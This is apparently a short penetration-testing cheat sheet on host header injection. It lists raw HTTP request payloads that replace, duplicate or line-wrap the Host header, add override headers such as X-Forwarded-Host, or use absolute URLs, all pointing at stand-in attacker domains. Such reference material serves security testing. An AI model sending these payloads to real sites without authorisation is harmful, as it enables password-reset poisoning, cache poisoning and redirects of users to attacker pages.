# Host Header Injection


1. Change the host header

```
GET /index.php HTTP/1.1
Host: evil-website.com
...

```

1. Duplicating the host header

```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...

```

1. Add line wrapping

```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...

```

1. Add host override headers

```
X-Forwarded-For: evil-website.com
X-Forwarded-Host: evil-website.com
X-Client-IP: evil-website.com
X-Remote-IP: evil-website.com
X-Remote-Addr: evil-website.com
X-Host: evil-website.com

```

How to use? In this case im using "X-Forwarded-For : evil.com"

```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : evil-website.com
...

```

1. Supply an absolute URL

```jsx
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```

```jsx
Location: http://www.attacker.com/login.php
X-Forwarded-Host: www.attacker.com
```